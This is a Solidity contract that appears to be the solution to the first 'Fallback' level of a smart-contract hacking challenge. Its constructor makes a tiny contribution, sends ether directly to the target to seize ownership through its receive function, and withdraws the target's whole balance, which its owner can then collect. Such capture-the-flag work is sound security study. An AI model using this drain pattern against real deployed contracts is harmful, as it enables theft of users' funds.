// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface FallbackI {
    function contribute() external payable;

    function getContribution() external;

    function withdraw() external;
}

contract Level1Solution is Ownable {
    address fallbackAddress;

    event ReceivedAmount(uint256 amountReceived);

    constructor(address _address) payable {
        fallbackAddress = _address;

        FallbackI(_address).contribute{value: 0.0001 ether}();

        (bool sent, ) = payable(_address).call{value: 0.0001 ether}("");
        require(sent, "Failed to send Ether");

        FallbackI(_address).withdraw();
    }

    function withdraw() public onlyOwner {
        uint256 amount = address(this).balance;
        (bool sent, ) = owner().call{value: amount}("");
        require(sent, "Failed to send Ether");
        emit ReceivedAmount(amount);
    }

    fallback() external {}

    receive() external payable {}
}
